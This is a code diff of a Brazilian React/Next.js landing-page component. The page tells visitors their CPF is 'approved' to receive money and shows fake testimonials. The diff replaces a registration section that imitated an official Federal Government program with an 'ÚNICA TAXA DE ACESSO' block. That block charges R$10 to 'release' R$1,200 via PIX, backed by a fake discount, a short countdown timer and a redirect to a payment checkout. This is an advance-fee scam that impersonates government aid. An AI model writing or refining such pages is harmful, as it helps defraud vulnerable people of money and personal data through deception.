@@ -5,7 +5,8 @@ import type React from 'react';
 import { useState, useEffect, FC, useRef } from 'react';
 import Image from 'next/image';
 import { Button } from '@/components/ui/button';
-import { CheckCircle, TrendingUp, ShieldCheck, Users } from 'lucide-react';
+import { CheckCircle, TrendingUp, Users, AlertTriangle, BadgeCent, ShieldCheck } from 'lucide-react';
+import OfferTimer from '@/components/features/OfferTimer';
 
 interface OfferStepProps {
   cpf: string | null;
@@ -76,32 +77,11 @@ const benefitsFromUserCode = [
     },
 ];
 
-const enrollmentSteps = [
-  {
-    title: "1. Verifique sua Elegibilidade",
-    description: "Confirme se você atende aos critérios de idade, renda e demais requisitos do programa.",
-    iconPlaceholder: "https://placehold.co/50x50.png",
-    iconHint: "clipboard check",
-  },
-  {
-    title: "2. Realize seu Cadastro",
-    description: "Preencha o formulário online com seus dados pessoais e de contato de forma segura.",
-    iconPlaceholder: "https://placehold.co/50x50.png",
-    iconHint: "form input",
-  },
-  {
-    title: "3. Acompanhe sua Solicitação",
-    description: "Após a submissão, você poderá acompanhar o status da sua inscrição diretamente na plataforma.",
-    iconPlaceholder: "https://placehold.co/50x50.png",
-    iconHint: "progress status",
-  },
-];
-
 
 const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
   const [peopleServed, setPeopleServed] = useState(2402);
   const [testimonials, setTestimonials] = useState<Testimonial[]>(fakeTestimonialsData);
-  const enrollmentSectionRef = useRef<HTMLDivElement>(null);
+  const taxSectionRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -118,33 +98,33 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
     };
   }, []);
   
-  const handleStartRegistration = () => {
+  const handleLiberarAcessoClick = () => {
+    taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
     setTimeout(() => {
-      console.log("Iniciar Minha Inscrição Agora clicado! CPF:", cpf);
-      alert("Você será redirecionado para a plataforma de cadastro oficial do Governo Federal.");
-      window.location.href = "https://gov.br/inscricao-jovem-cidadao"; // Example placeholder URL
-    }, 100);
+      alert("Você será redirecionado para a plataforma de pagamento segura AppMax para concluir a liberação da sua CHAVE PIX de R$1.200,00.");
+      window.location.href = "https://appmax.com.br/checkout-fake-placeholder"; 
+    }, 100); 
   };
   
   const handleEligibilityCheckClick = () => {
-    enrollmentSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
+    taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
   };
 
-  const formattedCpf = cpf || '***.***.***-**';
+  const formattedCpf = cpf ? cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : '***.***.***-**';
 
   return (
     <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground">
         
         <div className="text-center">
            <h2 className="font-headline text-xl md:text-2xl font-bold mb-2 text-foreground">
-            Parabéns, seu CPF {formattedCpf} foi aprovado para receber o dinheiro e os benefícios a seguir!
+            Parabéns, seu CPF <span className="text-accent font-mono">{formattedCpf}</span> foi aprovado para receber o dinheiro e os benefícios a seguir!
           </h2>
         </div>
 
-        {/* Benefícios disponíveis em destaque - Conforme código do usuário */}
+        {/* Benefícios disponíveis em destaque */}
         <div className="bg-white rounded-xl shadow-xl p-8 mb-8 border-l-8 border-green-600 animate-scale-in">
             <h2 className="text-2xl md:text-3xl font-black text-gray-800 mb-6 text-center">Acesso LIBERADO para você:</h2>
-            <div className="grid md:grid-cols-3 gap-6 mb-8">
+            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
                 {benefitsFromUserCode.map((beneficio, index) => (
                     <div key={index} className="bg-green-50 p-6 rounded-lg border border-green-200 shadow-md transform hover:scale-105 transition-all duration-200">
                         <div className="text-center">
@@ -159,7 +139,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             </div>
         </div>
 
-        {/* Nova Seção de Chamada para Ação (CTA) */}
+        {/* Seção de Chamada para Ação (CTA) */}
         <div className="text-center py-[50px] px-[20px] bg-[#0056b3] rounded-lg font-[Arial,sans-serif]">
           <h2 className="text-[2.2em] text-white mb-[20px] font-bold">
             Pronto para dar o Próximo Passo?
@@ -178,36 +158,39 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
           </p>
         </div>
           
-        {/* Nova Seção de Processo de Inscrição */}
-        <div ref={enrollmentSectionRef} className="py-[60px] px-[20px] bg-[#f8f9fa] text-center font-[Arial,sans-serif]">
-          <h2 className="text-[2.5em] text-[#003366] mb-[40px] font-bold font-headline">
-            Como Participar do Programa Jovem Cidadão Ativo
-          </h2>
-          <div className="max-w-[900px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-[30px]">
-            {enrollmentSteps.map((step, index) => (
-              <div key={index} className="bg-white p-[30px] rounded-[10px] shadow-[0_4px_8px_rgba(0,0,0,0.05)] text-left">
-                <Image
-                  src={step.iconPlaceholder}
-                  alt={`Ícone para ${step.title}`}
-                  width={50}
-                  height={50}
-                  data-ai-hint={step.iconHint}
-                  className="mb-[15px]"
-                />
-                <h3 className="text-[1.6em] text-[#0056b3] mb-[10px] font-bold font-headline">{step.title}</h3>
-                <p className="text-[1.1em] text-[#555]">{step.description}</p>
-              </div>
-            ))}
+        {/* Seção de Taxa Administrativa */}
+        <div ref={taxSectionRef} id="taxSection" className="my-10 p-6 md:p-8 bg-primary text-primary-foreground rounded-xl shadow-2xl border-4 border-yellow-400 text-center relative overflow-hidden">
+          <div className="absolute -top-4 -left-12 transform -rotate-45 bg-yellow-400 text-primary font-bold py-2 px-16 text-sm shadow-lg">
+            OFERTA ÚNICA
           </div>
-          <Button
-            onClick={handleStartRegistration}
-            className="bg-[#28a745] text-white py-[18px] px-[40px] text-[1.6em] font-bold border-none rounded-[10px] cursor-pointer mt-[50px] transition-colors duration-300 ease-linear hover:bg-[#218838] h-auto"
-          >
-            Iniciar Minha Inscrição Agora
-          </Button>
-          <p className="text-[0.9em] text-[#666] mt-[30px]">
-            <span className="font-bold text-[#003366]">Ambiente Seguro e Oficial do Governo Federal.</span> Sua privacidade é nossa prioridade.
+          <AlertTriangle className="h-12 w-12 text-yellow-400 mx-auto mb-4 animate-pulse" />
+          <h3 className="font-headline text-2xl md:text-3xl font-extrabold mb-2 uppercase">
+            ÚNICA TAXA DE ACESSO!
+          </h3>
+          <p className="text-lg md:text-xl mb-1 line-through opacity-70">DE <span className="font-bold">R$297,00</span></p>
+          <div className="my-3">
+            <span className="text-6xl md:text-8xl font-extrabold text-yellow-400 tracking-tighter">R$10</span>
+            <span className="text-4xl md:text-6xl font-extrabold text-yellow-400">,00</span>
+          </div>
+          <p className="text-sm md:text-base font-semibold bg-yellow-400 text-primary py-1 px-3 rounded-md inline-block mb-4 shadow-md">
+            (VOCÊ ACABA DE ECONOMIZAR <span className="font-bold">R$287,00</span> HOJE!)
           </p>
+          <p className="text-xs md:text-sm my-4 leading-relaxed max-w-md mx-auto px-2">
+            <span className="font-bold uppercase text-yellow-300">IMPORTANTE:</span> Pague <span className="font-bold">SOMENTE AGORA</span> esta taxa para cobrir os custos de processamento <span className="font-bold">SEGURO</span> e liberação automática dos seus <span className="font-bold text-yellow-300">R$1.200,00</span> via PIX! SAQUE GARANTIDO IMEDIATAMENTE APÓS O PIX!
+          </p>
+          <Button 
+            onClick={handleLiberarAcessoClick}
+            variant="default" 
+            size="lg" 
+            className="w-full max-w-md mx-auto h-16 text-xl md:text-2xl font-bold bg-accent hover:bg-accent/90 text-accent-foreground shadow-xl animate-pulse mt-4 rounded-lg border-2 border-yellow-200"
+          >
+            <BadgeCent className="mr-2 h-7 w-7" /> Quero Receber o dinheiro!
+          </Button>
+          <p className="text-xs mt-4 text-primary-foreground/80 flex items-center justify-center">
+            <ShieldCheck className="h-4 w-4 mr-1.5 text-green-300" /> Pagamento 100% SEGURO e Criptografado! 
+            <Image src="https://i.imgur.com/wXwSKIW.png" alt="AppMax Logo" width={60} height={15} className="ml-1.5 inline-block" data-ai-hint="payment processor" />
+          </p>
+           <OfferTimer initialMinutes={2} initialSeconds={30} /> 
         </div>
         
         {/* SEÇÃO DE PROVA SOCIAL */}
@@ -251,20 +234,5 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 };
 
 export default OfferStep;
-    
-    
 
     
-
-    
-
-    
-
-    
-
-
-
-
-
-
-
